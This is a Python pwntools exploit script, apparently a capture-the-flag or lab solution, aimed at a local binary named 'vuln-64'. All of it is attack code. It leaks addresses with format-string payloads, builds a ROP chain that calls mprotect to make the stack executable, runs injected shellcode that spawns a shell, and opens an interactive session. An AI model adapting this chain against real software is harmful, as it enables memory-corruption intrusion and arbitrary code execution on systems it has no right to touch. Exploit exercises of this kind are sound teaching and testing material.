from pwn import *

context(os='linux', arch='amd64')
io=process('./vuln-64')

io.sendline(b'%11$p') #fill in 00 to find ret addy in stack
ret_addr = int(io.recvline(),16)

io.recvline()
io.recvline()

io.sendline(b'%5$p')
purerdi = io.recvline()
rdi = int(purerdi[:-4] + b'000', 16)
shell = int(purerdi, 16)


libc = io.libs()['/usr/lib/x86_64-linux-gnu/libc.so.6']

win = ret_addr - 331 #fill in w difference between ret_addr and win function

buffer_addr = win + 0x4117

mprotect = libc + 0x1010f0 #fill in w offset from start of libc that mprotect is

#oflow = b'A' * 144

rsi = 0x1000
rdx = 0x7

poprdi = libc + 0x27c65
poprsi = libc + 0x29419
poprdx = libc + 0xfd6bd

stack_pivot = ret_addr + 0x2

sc = shellcraft.amd64.linux.sh()
sc += '   /* exit */\n    xor rax,rax\n    mov al, 0x3c\n   xor rdx,rdx\n   syscall'

exploit= bytearray(poprdi.to_bytes(8, byteorder='little'))#need to get to 144 bytes, at 8

exploit.extend(rdi.to_bytes(8, byteorder='little')) # now 16

exploit.extend(poprsi.to_bytes(8, byteorder='little')) # now 24

exploit.extend(rsi.to_bytes(8, byteorder='little'))  # now 32

exploit.extend(poprdx.to_bytes(8, byteorder='little')) #now 40

exploit.extend(rdx.to_bytes(8, byteorder='little')) # now 48

exploit.extend(mprotect.to_bytes(8, byteorder='little')) # now 56

shell = shell + 64
 
exploit.extend(shell.to_bytes(8, byteorder='little')) # now 64

exploit.extend(asm(sc))

exploit.extend((b'A' * (144 - 64 - 58)))

exploit.extend(stack_pivot.to_bytes(8, byteorder='little'))

io.recvline()
io.recvline()

# pid = gdb.attach(io, '''
# up
# b 42
# c
# tui layout asm
# ''')

io.sendline(exploit)

io.interactive()